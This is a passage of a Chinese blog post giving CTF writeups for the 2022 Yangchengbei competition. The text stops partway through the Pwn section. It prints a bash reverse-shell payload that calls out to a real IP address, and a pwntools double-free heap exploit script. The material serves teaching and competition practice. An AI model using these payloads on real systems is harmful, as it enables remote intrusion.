<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"twe1v3.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="羊城杯2022–Writeup ​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3  这个比赛太累了可，凌晨三点碰着枕头就睡着了，">
<meta property="og:type" content="article">
<meta property="og:title" content="羊城杯2022-Writeup">
<meta property="og:url" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/index.html">
<meta property="og:site_name" content="TWe1v3">
<meta property="og:description" content="羊城杯2022–Writeup ​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3  这个比赛太累了可，凌晨三点碰着枕头就睡着了，">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280.PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1.PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/2.PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(3).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(4).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(5).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280(6).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(6).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(7).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(8).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(9).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(10).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(11).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(12).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(13).PNG">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/14.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/15.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/16.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/TWe1v3%27s%20blog/Hexo/blog/source/_posts/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup.assets/17.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/18.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/19.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/20.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/21.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/22.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/23.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/24.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/25.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/26.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/27.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/28.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/29.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/30.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/31.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/32.png">
<meta property="article:published_time" content="2022-09-05T18:13:31.000Z">
<meta property="article:modified_time" content="2023-02-08T18:07:39.094Z">
<meta property="article:author" content="TWe1v3">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="Writeup">
<meta property="article:tag" content="Reverse">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280.PNG">


<link rel="canonical" href="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/","path":"2022/09/羊城杯2022-Writeup/","title":"羊城杯2022-Writeup"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>羊城杯2022-Writeup | TWe1v3</title>
  





<script src="/lib/fireworks.js"></script>
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">TWe1v3</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>文章标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>文章分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>时间轴</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于TWe1v3</a></li><li class="menu-item menu-item-friendlink"><a href="/friendlink/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link"><span class="nav-number">1.</span> <span class="nav-text">羊城杯2022–Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn-2"><span class="nav-number">1.1.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#YCBSQL"><span class="nav-number">1.1.1.</span> <span class="nav-text">YCBSQL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ez-linklist-v2"><span class="nav-number">1.1.2.</span> <span class="nav-text">ez_linklist-v2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#fakeNoOutput"><span class="nav-number">1.1.3.</span> <span class="nav-text">fakeNoOutput</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Dream"><span class="nav-number">1.1.4.</span> <span class="nav-text">Dream</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-4"><span class="nav-number">1.2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rce-me"><span class="nav-number">1.2.1.</span> <span class="nav-text">rce_me</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step-by-step-v3"><span class="nav-number">1.2.2.</span> <span class="nav-text">step_by_step-v3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Safepop"><span class="nav-number">1.2.3.</span> <span class="nav-text">Safepop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-5"><span class="nav-number">1.3.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EasyRsa"><span class="nav-number">1.3.1.</span> <span class="nav-text">EasyRsa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LRSA"><span class="nav-number">1.3.2.</span> <span class="nav-text">LRSA</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-3"><span class="nav-number">1.4.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.4.1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where-is-secret"><span class="nav-number">1.4.2.</span> <span class="nav-text">where_is_secret</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%B7%E5%A4%B1%E5%B9%BB%E5%A2%83"><span class="nav-number">1.4.3.</span> <span class="nav-text">迷失幻境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BA%B2%E7%8C%AB%E7%8C%AB"><span class="nav-number">1.4.4.</span> <span class="nav-text">躲猫猫</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Re"><span class="nav-number">1.5.</span> <span class="nav-text">Re</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#BBBButton"><span class="nav-number">1.5.1.</span> <span class="nav-text">BBBButton</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#check1"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">check1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#check2"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">check2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#easyjs"><span class="nav-number">1.5.2.</span> <span class="nav-text">easyjs</span></a></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="TWe1v3"
      src="/images/twe1v3.gif">
  <p class="site-author-name" itemprop="name">TWe1v3</p>
  <div class="site-description" itemprop="description">TWe1v3的博客</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">18</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/TWe1v3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TWe1v3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:twe1v3@qq.com" title="E-Mail → mailto:twe1v3@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>

    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://twe1v3.github.io/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/twe1v3.gif">
      <meta itemprop="name" content="TWe1v3">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="TWe1v3">
      <meta itemprop="description" content="TWe1v3的博客">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="羊城杯2022-Writeup | TWe1v3">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          羊城杯2022-Writeup
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-09-06 02:13:31" itemprop="dateCreated datePublished" datetime="2022-09-06T02:13:31+08:00">2022-09-06</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-02-09 02:07:39" itemprop="dateModified" datetime="2023-02-09T02:07:39+08:00">2023-02-09</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/Writeup/" itemprop="url" rel="index"><span itemprop="name">Writeup</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>34k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>30 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <h1>羊城杯2022–Writeup</h1>
<p>​                                                                                                                            -------TWe1v3、1amfree、scr1pt_k1ddi3</p>
<hr>
<p>这个比赛太累了可，凌晨三点碰着枕头就睡着了，不过收获也蛮多的，这次题目很友好，不像wmCTF一样坐大牢。感谢两位大哥的实力带飞，太菜了我。全靠躺。</p>
<span id="more"></span>          
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280.PNG" alt="排行榜"></p>
<h2 id="Pwn-2">Pwn</h2>
<h3 id="YCBSQL">YCBSQL</h3>
<p>这个应该是有了非预期，可以直接调用shell，我们直接反弹就行。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1.PNG" alt="1"></p>
<p>Payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.system bash -c <span class="string">&quot;bash -i  &gt;&amp;/dev/tcp/101.43.255.238/7777 0&gt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/2.PNG" alt="2"></p>
<h3 id="ez-linklist-v2">ez_linklist-v2</h3>
<p>这个题目的漏洞就是在unlink的时候如果是unlink的头指针，那么后面的指针没有清空，就会是这样：</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(3).PNG" alt="1280X1280 (3)"></p>
<p>然后在free函数的时候，如果offset是0xff，那么后面的指针就都能释放掉，因此就会产生double free。</p>
<p><img src="/2022/09/%E7%BE%8A%E5%9F%8E%E6%9D%AF2022-Writeup/1280X1280%20(4).PNG" alt="1280X1280 (4)"></p>
<p>所以实际上就是一个double free的利用。这里我一开始是用的9.7的libc，之后直接改成9.2的就行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># r=process(&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;)</span></span><br><span class="line">r=remote(<span class="string">&quot;tcp.dasc.buuoj.cn&quot;</span>,<span class="number">23916</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/pwn&quot;</span>)</span><br><span class="line"><span class="comment"># libc=ELF(&quot;/home/ubuntu/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc.so.6&quot;)</span></span><br><span class="line">libc=ELF(<span class="string">&quot;/home/ubuntu/pwn/比赛/羊城杯/pwn/libc.so.6&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">meau</span>(<span class="params">index</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    meau(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">link</span>(<span class="params">id1,id2</span>):</span><br><span class="line">    meau(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link from:&quot;</span>,<span class="built_in">str</span>(id1))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;link to:&quot;</span>,<span class="built_in">str</span>(id2))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlink</span>(<span class="params">index,offset</span>):</span><br><span class="line">    meau(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x70</span>,p64(<span class="number">0</span>)+p64(<span class="number">0X451</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">unlink(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0xff</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">link(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">r.recvuntil(<span class="string">&quot;Offset 1:&quot;</span>)</span><br><span class="line">heap_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2e0</span></span><br><span class="line">success(<span class="string">&quot;heap_base = &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Input offset:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">link(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">unlink(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">3</span>,<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x450</span>)+p64(heap_base+<span class="number">0x3b0</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&quot;z&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">8</span>)+p64(heap_base+<span class="number">0x460</span>)</span><br><span class="line">add(<span class="number">0x18</span>,payload)</span><br><span class="line"></span><br><span class="line">link(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">meau(<span class="number">4</span>)</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">libc_base=u64(r.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x10</span> -<span class="number">96</span> - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base = &quot;</span>+<span 